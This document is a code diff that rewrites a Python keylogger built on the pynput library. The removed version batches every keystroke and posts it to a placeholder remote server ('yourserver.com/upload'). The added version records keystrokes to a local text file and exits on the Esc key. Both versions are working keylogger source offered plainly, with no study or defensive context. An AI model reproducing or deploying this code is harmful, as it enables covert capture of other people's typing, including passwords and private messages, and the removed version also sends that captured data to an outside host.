@@ -1,69 +1,66 @@
-import logging
-import pynput
-from pynput.keyboard import Key, Listener
-import datetime
+from pynput import keyboard
 import time
-import requests
-import os
 
-class KeystrokeRecorder:
-    def __init__(self):
-        self.unix_time = int(time.mktime(datetime.datetime.now().timetuple()))
-        self.count, self.keys = 0, []
+# Path for the text file to store output
+log_file = "keylogger_output.txt"
+
+# Last key press time to track inactivity
+last_key_time = time.time()
+
+# Delay for screen inactivity (3 seconds)
+inactivity_delay = 3
+
+# Function to write keystrokes to the text file
+def write_to_text(key):
+    global last_key_time
+    
+    try:
+        # Check if 3 seconds have passed since the last key press
+        current_time = time.time()
+        if current_time - last_key_time >= inactivity_delay:
+            with open(log_file, 'a') as logKey:
+                logKey.write('\n')  # Start a new line after 3 seconds of inactivity
+
+        # Handle regular characters
+        if key.char:
+            with open(log_file, 'a') as logKey:
+                logKey.write(key.char)
         
-        # Use environment variable for log filename or fallback to default
-        log_filename = os.getenv("KEY_LOG_FILENAME", f"log_{self.unix_time}.txt")
-        
-        logging.basicConfig(
-            filename=log_filename,
-            level=logging.INFO,
-            format="%(message)s",
-        )
+        # Handle special keys
+        elif key == keyboard.Key.space:
+            with open(log_file, 'a') as logKey:
+                logKey.write(' ')  # Space
+        elif key == keyboard.Key.enter:
+            with open(log_file, 'a') as logKey:
+                logKey.write('\n')  # Newline (Enter key)
+        elif key == keyboard.Key.tab:
+            with open(log_file, 'a') as logKey:
+                logKey.write('\t')  # Tab key
+        elif key == keyboard.Key.shift or key == keyboard.Key.ctrl or key == keyboard.Key.alt:
+            return  # Ignore shift/ctrl/alt keys
 
-    def send_logs(self, log_data):
-        """Send log data to a remote server."""
-        try:
-            response = requests.post("http://yourserver.com/upload", json=log_data)
-            if response.status_code == 200:
-                logging.info("Logs sent successfully.")
-            else:
-                logging.error("Failed to send logs.")
-        except requests.RequestException as e:
-            logging.error(f"Error sending logs: {e}")
+        # Update the last key press time
+        last_key_time = current_time
 
-    def on_press(self, key):
-        """Record keystrokes to a log file."""
-        self.keys.append(key)
-        self.count += 1
+    except AttributeError:
+        pass
 
-        if self.count >= 10:
-            self.count = 0
-            self.write_file()
-            self.keys = []
+# Function to handle key press
+def keyPressed(key):
+    print(f"Key pressed: {key}")
+    write_to_text(key)
 
-    def write_file(self):
-        """Save the keystrokes to a log file and send to server."""
-        log_data = []
-        for key in self.keys:
-            k = str(key).replace("'", "")
-            if k == "space":
-                log_data.append(" ")
-            elif k.startswith("Key"):
-                log_data.append(k.split('.')[1])
-            else:
-                log_data.append(k)
-
-        # Send the logs to the server
-        self.send_logs({"logs": log_data})
-
-    def on_release(self, key):
-        """Kill the program on hitting the Esc button."""
-        if key == Key.esc:
-            return False
+    # Exit on pressing Esc key
+    if key == keyboard.Key.esc:
+        print("Exiting keylogger...")
+        return False
 
 if __name__ == "__main__":
-    recorder = KeystrokeRecorder()
-    with Listener(
-        on_press=recorder.on_press, on_release=recorder.on_release
-    ) as listener:
-        listener.join()
+    print("Keylogger started... Press 'Esc' to stop.")
+    
+    # Start the listener
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+
+    # Wait for the user to stop the script (e.g., pressing 'Esc')
+    listener.join()
